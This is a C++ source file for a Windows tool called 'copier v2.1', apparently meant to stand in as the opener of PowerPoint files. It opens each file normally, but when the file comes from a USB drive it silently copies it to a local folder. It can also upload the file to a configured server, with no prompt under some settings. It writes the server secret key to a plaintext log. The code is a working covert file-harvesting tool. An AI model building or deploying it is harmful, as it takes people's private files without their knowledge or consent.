#include <cstdio>
#include <string>
#include <regex>
#include <windows.h>
#include <direct.h> //_mkdir
#include <cstdarg>  //可变参数
#include "tools.h"
#include "configparser/ini_parser.h"
#include "network/network_socket.h"

using namespace std;
//#define DEBUG_MODE true

// 定义函数
int conf();

int checkConf();

void log(const char *, ...);

HANDLE executePPTFile();

void checkEnvironment_with1arg();

void executeAndCopyFile_with2args();

void testNetStatus_with1arg();

void sendFileAfterCopy_with2args();

/* 配置变量 */
int ConfigStatus, C_CopyFlush, C_MaxSendSize, CopierRunStatus = 1;
bool C_SendPPT;
string C_PowerPointPath, C_CopyPath, C_IgnoreDisk, C_ServerAddr, C_SecretKey;

int argc;
string f_path;

wchar_t copyRight[] = L"copier v2.1--by XN & XY";

/* 加载配置 */
int conf()
{
    int ret_read;
    IniParser ip;
    // read
    ret_read = ip.read(getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.ini");
    rff<int>
            R_CopyFlush = ip.get_v_int("copier", "CopyFlush", 1024),
            R_MaxSendSize = ip.get_v_int("net_work", "MaxSendSize", -1);
    rff<bool>
            R_SendPPT = ip.get_v_bool("net_work", "SendPPT");
    rff<string>
            R_PowerPointPath = ip.get_v_string("copier", "PowerPointPath"),
            R_CopyPath = ip.get_v_string("copier", "CopyPath"),
            R_IgnoreDisk = ip.get_v_string("copier", "IgnoreDisk"),
            R_ServerAddr = ip.get_v_string("net_work", "ServerAddr"),
            R_SecretKey = ip.get_v_string("net_work", "SecretKey");
    // init
    C_PowerPointPath = R_PowerPointPath.value();
    C_CopyPath = R_CopyPath.value();
    C_IgnoreDisk = R_IgnoreDisk.value();
    C_CopyFlush = R_CopyFlush.value();
    //
    C_ServerAddr = R_ServerAddr.value();
    C_SendPPT = R_SendPPT.value();
    C_SecretKey = R_SecretKey.value();
    C_MaxSendSize = R_MaxSendSize.value();
    // return
    return ret_read | R_PowerPointPath.status() | R_CopyPath.status() | R_IgnoreDisk.status() |
           R_CopyFlush.status() | R_ServerAddr.status() | R_SendPPT.status() | R_SecretKey.status();
}

int checkConf()
{
    // PNTP
    if (getFileSize(C_PowerPointPath) < 0)
    {
        log("PowerPoint 不存在，请检查配置文件\n");
        MessageBoxW(nullptr, L"PowerPoint 不存在，请检查配置文件", copyRight, MB_SYSTEMMODAL | MB_ICONERROR);
        return -1;
    }

    // CopyFlush
    if (C_CopyFlush <= 0 || C_CopyFlush > 4000000)
    {
        log("配置 CopyFlush 需在 [1, 4000000] 区间内，请检查配置文件\n");
        MessageBoxW(nullptr, L"配置 CopyFlush 需在 [1, 4000000] 区间内，请检查配置文件", copyRight,
                    MB_SYSTEMMODAL | MB_ICONERROR);
        return -2;
    }

    // ServerAddr
    if (!regex_match(C_ServerAddr, regex(R"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})")))
    {
        log("配置 ServerAddr 必须是一个 IPv4 的地址，请检查配置文件\n");
        MessageBoxW(nullptr, L"配置 ServerAddr 必须是一个 IPv4 的地址，请检查配置文件", copyRight,
                    MB_SYSTEMMODAL | MB_ICONERROR);
        return -3;
    }

    return 0;
}

void log(const char *format, ...)
{
    tm *p = get_tm();
    // 输出时间
    printf("[%04d/%02d/%02d %02d:%02d:%02d] ",
           p->tm_year + 1900, p->tm_mon + 1, p->tm_mday, p->tm_hour, p->tm_min, p->tm_sec);
    // 输出调试信息
    va_list args;           // 定义可变参数列表对象
    va_start(args, format); // format 存储格式字符串，作为可变参数起点的前一个参数标识
    vprintf(format, args);  // 整合格式字符串和可变参数
    va_end(args);           // 清除可变参数列表对象args
}

/* 用PNT打开指定文件 */
HANDLE executePPTFile()
{
    return ShellExecuteA(nullptr, "open",
                         ("\"" + C_PowerPointPath + "\"").c_str(),
                         ("\"" + f_path + "\"").c_str(),
                         nullptr, SW_SHOWNORMAL);
}

void checkEnvironment_with1arg()
{
    log("参数为 %d 个 (不是 2 个), 执行检查环境\n", argc);
    // 康康 PNT 是否存在
    if (getFileSize(C_PowerPointPath) > -1)
    {
        log("PowerPoint 环境正常！可以使用！\n");
        MessageBoxW(nullptr, L"环境正常！可以使用！", copyRight, MB_SYSTEMMODAL | MB_ICONINFORMATION);
    }
    else
    {
        log("未找到 PowerPoint 程序！请检查配置！\n");
        MessageBoxW(nullptr, L"未找到PowerPoint程序！\n请检查配置！", copyRight, MB_SYSTEMMODAL | MB_ICONERROR);
    }
    testNetStatus_with1arg();
}

void executeAndCopyFile_with2args()
{
    // 有 2 个参数，打开（，再拷贝）
    string f_name = getFilePathSplitByAbs(f_path, 3).value();
    log("参数为 2 个，执行文件操作\n");
    log("打开文件路径: %s\n", GBKStringToUTF8String(f_path).c_str());
    log("文件所在盘: %c\n", toupper(f_path[0]));
    log("文件名: %s\n", GBKStringToUTF8String(f_name).c_str());
    executePPTFile(); // 打开文件
    // 判断是否在 U 盘
    if (isInUDisk(f_path, C_IgnoreDisk)) // 在U盘中，复制
    {
        log("这个文件 *在* U盘中，先打开再复制\n");
        log("创建文件夹状态: %d\n", // 创建文件夹，0 为原来不存在但创建成功，-1 为原来存在文件夹而不用创建
            _wmkdir(UTF8StringToUTF16WString(C_CopyPath).c_str())); // C_CopyPath 本来是 UTF-8
        log("文件拷贝目标: %s%s\n", C_CopyPath.c_str(),
            GBKStringToUTF8String(getFilePathSplitByAbs(f_path, 3).value()).c_str());
        log("文件拷贝状态: %d\n", // 复制文件
            copyFile(f_path,
                     UTF8StringToGBKString(C_CopyPath) + getFilePathSplitByAbs(f_path, 3).value(),
                     C_CopyFlush)); // 0 为正常，1 为找不到源文件，-1 为创建文件失败
    }
    else // 不在U盘中，不复制
    {
        log("这个文件 *不在* U盘中，直接打开\n");
    }
    // 网络发送
    if (C_SendPPT)
    {
        sendFileAfterCopy_with2args();
    }
}

void testNetStatus_with1arg()
{
    int netStatus;
    log("检查网络连接状态\n");
    Socket_copier_part s(C_ServerAddr, C_SecretKey);
    if (s.sta)
    {
        MessageBoxW(nullptr, L"网络连接失败！", copyRight, MB_SYSTEMMODAL | MB_ICONERROR);
        return;
    }
    log("version: %d\n", s.send_version());
    log("what: %d\n", s.send_what(0));
    log("sk: %d\n", s.send_sk());
    log("-> net_status: %d\n", netStatus = s.recv_net_status());
    switch (netStatus)
    {
        case 0:
            MessageBoxW(nullptr, L"连接网络成功！密码正确！", copyRight, MB_SYSTEMMODAL | MB_ICONINFORMATION);
            break;
        case 1:
            MessageBoxW(nullptr, L"密码错误！", copyRight, MB_SYSTEMMODAL | MB_ICONERROR);
            break;
        case -1:
            MessageBoxW(nullptr, L"网络连接失败！", copyRight, MB_SYSTEMMODAL | MB_ICONERROR);
            break;
        default:
            break;
    }
}

void sendFileAfterCopy_with2args()
{
    int needSend;
    log("发送文件\n");
    // 大小限制
    // 超过这个大小将弹窗询问是否传输
    // 单位: 字节
    //  0 则为始终弹窗询问
    // -1 则为无限制（始终不弹窗询问）
    if (C_MaxSendSize == 0 || (C_MaxSendSize > 0 && getFileSize(f_path) > C_MaxSendSize))
    {
        if (MessageBoxW(nullptr, L"是否发送该文件？", copyRight, MB_SYSTEMMODAL | MB_ICONINFORMATION | MB_YESNO) == IDNO)
        {
            return;
        }
    }

    Socket_copier_part s(C_ServerAddr, C_SecretKey);
    if (s.sta)
    {
        return;
    }
    log("version: %d\n", s.send_version());
    log("what: %d\n", s.send_what(1));
    log("sk: %d\n", s.send_sk());
    log("md5: %d\n", s.send_hash(f_path));
    log("name_size: %d\n", s.send_name_size(f_path));
    log("content_size: %d\n", s.send_content_size(f_path));
    log("name: %d\n", s.send_name(f_path));
    log("-> need_content? %d\n", needSend = s.recv_need_2_send_content());
    if (needSend)
    {
        log("content: %d\n", s.send_content(f_path));
    }
}

/* 主函数 */
int main(int _argc, char *_argv[])
{
#ifndef DEBUG_MODE
    // 重定向文件
    freopen((getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.log").c_str(), "a", stdout);
    freopen((getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.log").c_str(), "a", stderr);
#endif
#ifdef DEBUG_MODE
    system("chcp 65001");
#endif
    tm *p;
    // 只能同时运行一次
    HANDLE hMutex = CreateMutexA(nullptr, true, "CopierSingleInstanceMutex");
    if (GetLastError() == ERROR_ALREADY_EXISTS)
    {
        CopierRunStatus = -1;
        log("copier 已打开，取消操作\n");
        MessageBoxW(nullptr, L"文件已打开，请耐心等待！", copyRight, MB_SYSTEMMODAL | MB_ICONINFORMATION);
        goto copier_exit;
    }

    argc = _argc;
    // 配置文件读取
    if (getFileSize(getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.ini") < 0)
    {
        CopierRunStatus = -2;
        log("未找到 copier.ini，程序无法运行\n");
        MessageBoxW(nullptr, L"未找到 copier.ini，程序无法运行", copyRight, MB_SYSTEMMODAL | MB_ICONERROR);
        goto copier_exit;
    }
    ConfigStatus = conf();
    p = get_tm();
    printf("\n%scopier v2.1 于 %04d/%02d/%02d %02d:%02d:%02d 启动%s\n",
           string(50, '-').c_str(),
           p->tm_year + 1900, p->tm_mon + 1, p->tm_mday, p->tm_hour, p->tm_min, p->tm_sec,
           string(50, '-').c_str());
    log("EXE 路径: %s\n", GBKStringToUTF8String(getExeFileAbsPath()).c_str());
    log("工作目录: %s\n", GBKStringToUTF8String(getFilePathSplitByAbs(getExeFileAbsPath(), 1).value()).c_str());
    log("日志文件路径: %s\n",
        GBKStringToUTF8String(getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.log").c_str());
    log("配置文件路径: %s\n",
        GBKStringToUTF8String(getFilePathSplitByAbs(getExeFileAbsPath(), 1).value() + "copier.ini").c_str());
    log("配置状态: %d\n", ConfigStatus); // 0 为正常，-1 为读取配置文件异常
    log(R"(配置信息如下:
    [copier]
        PowerPointPath = "%s"
        CopyPath = "%s"
        IgnoreDisk = "%s"
        CopyFlush = %d
    [net_work]
        ServerAddr = "%s"
        SendPPT = %d
        SecretKey = "%s"
        MaxSendSize = %d
)",
        C_PowerPointPath.c_str(), C_CopyPath.c_str(), C_IgnoreDisk.c_str(), C_CopyFlush,
        C_ServerAddr.c_str(), C_SendPPT, C_SecretKey.c_str(), C_MaxSendSize);

    // 不合法的配置信息
    if (checkConf() != 0)
    {
        CopierRunStatus = -3;
        goto copier_exit;
    }

    // 干正事
    if (argc == 2)
    {
        f_path = _argv[1];
        executeAndCopyFile_with2args();
        CopierRunStatus = 0;
    }
    else
    {
        checkEnvironment_with1arg();
        CopierRunStatus = 0;
    }

    // 退出程序
    copier_exit:
    CloseHandle(hMutex);
    log("程序正常退出 (%d)\n", CopierRunStatus);
#ifndef DEBUG_MODE
    fclose(stdout);
    fclose(stderr);
#endif
    // 好习惯
    return 0;
}
